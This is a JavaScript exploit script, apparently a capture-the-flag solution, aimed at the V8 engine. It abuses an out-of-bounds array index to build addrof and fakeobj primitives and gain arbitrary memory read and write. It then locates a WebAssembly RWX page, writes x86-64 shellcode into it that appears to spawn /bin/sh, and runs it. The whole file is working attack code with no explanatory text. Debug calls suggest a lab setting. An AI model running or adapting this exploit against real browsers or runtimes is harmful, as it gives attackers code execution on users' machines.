var i64 = new BigInt64Array(1);
var f64 = new Float64Array(i64.buffer);

// helper function
function ftoi(x) {
  f64[0] = x;
  return i64[0];
}

function itof(x) {
  i64[0] = x;
  return f64[0];
}

function hex(i) {
  return "0x" + i.toString(16);
}

a = Array(87);
b = [1.1, 1.2, 1.3];

function addrof(obj) {
  a[89] = obj;
  return ftoi(b[0]) & ((1n<<32n)-1n);
}

function fakeobj(addr) {
  b[0] = itof(addr);
  return a[89];
}

// leak b's map & properties & length
map = ftoi(b[3]) & ((1n<<32n) - 1n);
console.log(hex(map));

data = [itof(map), 2.2, 2.3, 2.4];
fake_obj = fakeobj(addrof(data) - 0x28n + 0x8n);

// %DebugPrint(b);
// %DebugPrint(fake_obj);

function read64(addr) {
  data[1] = itof((2n<<32n) | (addr - 8n));
  return ftoi(fake_obj[0]);
}

function write64(addr, value) {
  data[1] = itof((2n<<32n) | (addr - 8n));
  fake_obj[0] = itof(value);
}

// console.log(hex(read64(addrof(b))));
// write64(addrof(b), 0xdeadbeefn);

// create rwx page
let bytes = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,144,128,128,128,0,2,6,109,101,109,111,114,121,2,0,3,112,119,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
let mod = new WebAssembly.Module(bytes);
let instance = new WebAssembly.Instance(mod);
let pwn = instance.exports.pwn;

wasm = read64(addrof(instance) + 0x60n);
console.log(hex(wasm));

arr = new ArrayBuffer(0x100);
write64(addrof(arr) + 0x1cn, wasm);

let shellcode = [0x6e69622fb848686an, 0xe7894850732f2f2fn, 0x2434810101697268n, 0x6a56f63101010101n, 0x894856e601485e08n, 0x50f583b6ad231e6n];
let i64_arr = new BigInt64Array(arr);

for (i = 0; i < shellcode.length; i++) {
  i64_arr[i] = shellcode[i];
}
pwn();

// %DebugPrint(arr);

// %DebugPrint(instance);

// %SystemBreak();
